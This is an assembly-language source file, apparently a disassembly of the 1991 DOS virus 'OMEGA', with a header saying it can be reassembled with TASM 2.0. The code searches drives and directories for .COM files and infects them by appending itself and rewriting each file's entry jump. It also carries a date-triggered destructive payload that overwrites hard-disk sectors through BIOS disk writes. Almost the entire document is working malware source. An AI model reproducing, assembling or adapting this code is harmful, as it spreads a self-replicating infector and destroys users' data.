  
PAGE  59,132
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        OMEGA				         €€
;€€								         €€
;€€      Created:   4-Dec-91					         €€
;€€                                                                      €€
;€€ Disassembled by -=>Wasp<=- aka >>Night Crawler<<                     €€
;€€                                                                      €€
;€€ Reassemble with TASM 2.0                                             €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
DATA_1E		EQU	80H
  
SEG_A		SEGMENT	BYTE PUBLIC
		ASSUME	CS:SEG_A, DS:SEG_A
  
  
		ORG	100h
  
OMEGA		PROC	FAR
  
START:
		PUSH	AX
		PUSH	CS
		POP	DS
		CALL	SUB_1			; (0106)
  
OMEGA		ENDP
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
SUB_1		PROC	NEAR
		POP	BP
		LEA	BP,[BP+1AFH]		; Load effective addr
		MOV	AH,1AH
		MOV	DX,BP
		INT	21H			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		LEA	DI,[BP+30H]		; Load effective addr
		MOV	[BP+2EH],DI
		CALL	SUB_5			; (01DC)
		CALL	SUB_4			; (0184)
		LEA	DI,[BP+30H]		; Load effective addr
		LEA	SI,[BP-5]		; Load effective addr
		NOP
		CALL	SUB_2			; (015D)
		MOV	[BP+2EH],DI
		CALL	SUB_5			; (01DC)
		CALL	SUB_4			; (0184)
		MOV	AH,2AH			; '*'
		INT	21H			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dx=mon/day
		CMP	AL,5
		JNE	LOC_1			; Jump if not equal
		CMP	DL,0DH
		JNE	LOC_1			; Jump if not equal
		CALL	SUB_3			; (0165)
		INT	20H			; Program Terminate
LOC_1:
		MOV	AH,1AH
		MOV	DX,DATA_1E
		INT	21H			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		LEA	SI,[BP-1B8H]		; Load effective addr
		MOV	DI,OFFSET DS:[100H]
		CLD				; Clear direction
		MOVSW				; Mov [si] to es:[di]
		MOVSB				; Mov [si] to es:[di]
		PUSH	CS
		POP	ES
		PUSH	CS
		POP	DS
		POP	AX
		MOV	DI,OFFSET START
		PUSH	DI
		RETN
SUB_1		ENDP
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
SUB_2		PROC	NEAR
LOC_2:
		LODSB				; String [si] to al
		STOSB				; Store al to es:[di]
		OR	AL,AL			; Zero ?
		JNZ	LOC_2			; Jump if not zero
		DEC	DI
		RETN
SUB_2		ENDP
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
SUB_3		PROC	NEAR
		MOV	AH,2
		MOV	DL,0EAH
		INT	21H			; DOS Services  ah=function 02h
						;  display char dl
		MOV	AX,308H
		MOV	CX,1
		MOV	DX,80H
		INT	13H			; Disk  dl=drive 0  ah=func 03h
						;  write sectors from mem es:bx
		MOV	AX,308H
		MOV	CX,1
		MOV	DX,180H
		INT	13H			; Disk  dl=drive 0  ah=func 03h
						;  write sectors from mem es:bx
		RETN
SUB_3		ENDP
  
		DB	 2AH, 00H
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
SUB_4		PROC	NEAR
		LEA	SI,[BP-133H]		; Load effective addr
		MOV	DI,[BP+2EH]
		PUSH	DI
		CALL	SUB_2			; (015D)
		POP	DI
		LEA	DX,[BP+30H]		; Load effective addr
		MOV	AH,4EH			; 'N'
		MOV	CX,10H
		INT	21H			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		JC	LOC_RET_7		; Jump if carry Set
LOC_3:
		CMP	BYTE PTR [BP+1EH],2EH	; '.'
		JE	LOC_6			; Jump if equal
		PUSH	DI
		LEA	SI,[BP+1EH]		; Load effective addr
		CALL	SUB_2			; (015D)
		MOV	AL,5CH			; '\'
		STOSB				; Store al to es:[di]
		MOV	[BP+2EH],DI
		SUB	SP,15H
		MOV	CX,15H
		MOV	DI,SP
		MOV	SI,BP
  
LOCLOOP_4:
		MOVSB				; Mov [si] to es:[di]
		LOOP	LOCLOOP_4		; Loop if cx > 0
  
		CALL	SUB_5			; (01DC)
		MOV	CX,15H
		MOV	SI,SP
		MOV	DI,BP
  
LOCLOOP_5:
		MOVSB				; Mov [si] to es:[di]
		LOOP	LOCLOOP_5		; Loop if cx > 0
  
		ADD	SP,15H
		POP	DI
LOC_6:
		MOV	AH,4FH			; 'O'
		INT	21H			; DOS Services  ah=function 4Fh
						;  find next filename match
		JC	LOC_RET_7		; Jump if carry Set
		JMP	SHORT LOC_3		; (019C)
  
LOC_RET_7:
		RETN
SUB_4		ENDP
  
		DB	 2AH, 2EH, 43H, 4FH, 4DH, 00H
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
SUB_5		PROC	NEAR
		LEA	SI,[BP-0DFH]		; Load effective addr
		MOV	DI,[BP+2EH]
		CALL	SUB_2			; (015D)
		LEA	DX,[BP+30H]		; Load effective addr
		MOV	AH,4EH			; 'N'
		MOV	CX,0
		INT	21H			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		JC	LOC_RET_11		; Jump if carry Set
LOC_8:
		CMP	WORD PTR [BP+1AH],0F000H
		JA	LOC_10			; Jump if above
		LEA	SI,[BP+1EH]		; Load effective addr
		MOV	DI,[BP+2EH]
		CALL	SUB_2			; (015D)
		LEA	DX,[BP+30H]		; Load effective addr
		MOV	AX,3D02H
		INT	21H			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		JC	LOC_10			; Jump if carry Set
		MOV	BX,AX
		MOV	AX,4202H
		MOV	DX,0FF21H
		MOV	CX,0FFFFH
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JC	LOC_9			; Jump if carry Set
		MOV	WORD PTR [BP+2BH],0
		LEA	DX,[BP+2BH]		; Load effective addr
		MOV	AH,3FH			; '?'
		MOV	CX,2
		INT	21H			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		JC	LOC_9			; Jump if carry Set
		CMP	WORD PTR [BP+2BH],2E2AH
		JE	LOC_9			; Jump if equal
		CALL	SUB_6			; (0243)
LOC_9:
		MOV	AH,3EH			; '>'
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
LOC_10:
		MOV	AH,4FH			; 'O'
		INT	21H			; DOS Services  ah=function 4Fh
						;  find next filename match
		JC	LOC_RET_11		; Jump if carry Set
		JMP	SHORT LOC_8		; (01F2)
  
LOC_RET_11:
		RETN
SUB_5		ENDP
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
SUB_6		PROC	NEAR
		MOV	AX,4200H
		MOV	CX,0
		MOV	DX,0
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JNC	LOC_12			; Jump if carry=0
		JMP	SHORT LOC_RET_13	; (02AF)
LOC_12:
		MOV	AH,3FH			; '?'
		MOV	CX,3
		LEA	DX,[BP+2BH]		; Load effective addr
		INT	21H			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AX,4202H
		MOV	CX,0
		MOV	DX,0
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AH,40H			; '@'
		MOV	CX,3
		LEA	DX,[BP+2BH]		; Load effective addr
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AH,40H			; '@'
		MOV	CX,1B5H
		LEA	DX,[BP-1B5H]		; Load effective addr
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AX,4200H
		MOV	CX,0
		MOV	DX,0
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AX,[BP+1AH]
		MOV	DI,OFFSET DS:[101H]
		STOSW				; Store ax to es:[di]
		MOV	AH,40H			; '@'
		MOV	CX,3
		MOV	DX,OFFSET DS:[100H]
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AX,5701H
		MOV	CX,[BP+16H]
		MOV	DX,[BP+18H]
		INT	21H			; DOS Services  ah=function 57h
						;  get/set file date & time
  
LOC_RET_13:
		RETN
SUB_6		ENDP
  
		DB	 43H, 3AH, 5CH, 00H, 00H
  
SEG_A		ENDS
  
  
  
		END	START
